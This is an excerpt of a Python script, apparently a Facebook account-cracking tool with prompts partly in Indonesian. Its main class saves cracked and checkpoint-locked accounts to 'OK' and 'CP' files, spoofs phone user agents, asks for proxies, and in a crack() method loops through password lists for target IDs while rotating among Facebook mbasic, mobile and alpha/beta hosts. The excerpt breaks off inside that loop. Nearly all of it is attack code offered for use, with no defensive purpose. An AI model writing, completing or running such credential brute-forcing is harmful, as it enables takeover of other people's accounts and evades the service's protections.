...
class main:
    def __init__(self,file):
        ...
        self.file   = file
        self.data   = []
        self.file_ok = 'OK/%s.txt'%(waktu())
        self.file_cp = 'CP/%s.txt'%(waktu())
        self.pilih_methode()
        self.user_agent()
        self.takon_proxy()
        self.show_saved()
    ...
    def user_agent(self):
        ...
        print('%s│%s│'%(y,' '*72))
        print('%s│      %s[%s1%s] %sSamsung   %s[%s2%s] %sXiaomi   %s[%s3%s] %sRealme   %s[%s4%s] %sVivo   %s[%s0%s] %sCustom     %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│%s│'%(y,' '*72))
        print('%s╰─ ┌─ [ %sPilih %s] ─────────────────────────────────────────────────────────╯%s'%(y,P,y,P))
        xo = input('   %s└──> %s'%(M,P))
        print('')
        ...
        elif xo in ['4', '04' ,'d']: self.ua_stat = 'Vivo' 
        elif xo in ['0', '00' ,'z']:
            try: os.mkdir('login')
    ...
    def crack(self,id,ps):
        try:
            for pw in ps:
                mba = random.choice(['mbasic.facebook.com','mbasic.alpha.facebook.com','mbasic.beta.facebook.com','d.facebook.com','d.alpha.facebook.com','d.beta.facebook.com'])
                mob = random.choice(['m.facebook.com','m.alpha.facebook.com','m.beta.facebook.com','x.facebook.com','x.alpha.facebook.com','x.beta.facebook.com'])
